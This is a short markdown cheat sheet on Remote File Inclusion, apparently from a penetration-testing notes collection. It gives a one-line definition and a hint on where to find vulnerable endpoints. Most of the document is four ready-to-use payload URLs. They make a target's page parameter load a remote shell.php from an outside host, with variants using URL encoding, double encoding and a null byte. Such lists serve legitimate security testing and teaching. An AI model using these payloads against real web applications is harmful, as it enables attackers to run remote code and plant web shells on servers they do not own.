## Remote File Inclusion (RFI)

## Introduction
Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.

## Where to find
- Any endpoint that includes a file from a web server. For example, `/index.php?page=index.html`

## How to exploit
1. Basic payload
```
http://example.com/index.php?page=http://daffa.info/shell.php
```

2. URL encoding
```
http://example.com/index.php?page=http%3A%2F%2Fdaffa.info%2Fshell.php
```

3. Double encoding
```
http://example.com/index.php?page=http%253A%252F%252Fdaffa.info%252Fshell.php
```

4. Using Null Byte (%00)
```
http://example.com/index.php?page=http://daffa.info/shell.php%00
```
